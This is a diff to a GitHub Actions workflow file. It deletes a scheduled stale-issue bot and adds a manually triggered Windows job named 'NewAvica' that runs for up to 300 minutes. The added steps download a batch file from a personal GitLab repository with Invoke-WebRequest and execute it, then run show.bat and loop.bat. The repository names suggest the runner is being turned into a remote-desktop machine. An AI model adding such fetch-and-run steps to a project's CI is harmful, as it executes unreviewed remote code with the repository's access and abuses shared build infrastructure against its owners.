@@ -1,25 +1,22 @@
-name: Run Stale Bot
-on:
-  schedule:
-    - cron: '30 1 * * *'
+name: NewAvica
 
-permissions:
-  contents: read
+on:
+  workflow_dispatch:
 
 jobs:
-  stale:
-    name: Run Stale
-    runs-on: ubuntu-latest
-    permissions:
-      issues: write         # for actions/stale to close stale issues
-      pull-requests: write  # for actions/stale to close stale PRs
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 300
+    
     steps:
-      - uses: actions/stale@v9
-        with:
-          stale-issue-message: 'This issue is stale because it has been open 30 days with no activity. Remove stale label or comment or this will be closed in 5 days.'
-          # turn off stale for both issues and PRs
-          days-before-stale: -1
-          # turn stale back on for issues only
-          days-before-issue-stale: 30
-          days-before-issue-close: 14
-          exempt-issue-labels: 'pinned,security,enhancement,refactor,documentation,chore,bug,dependencies,needs-investigation'
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://gitlab.com/gusta7w7/pcrdp-avica/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Show Website
+        run: cmd /c show.bat
+
+      - name: Time Counter
+        run: cmd /c loop.bat
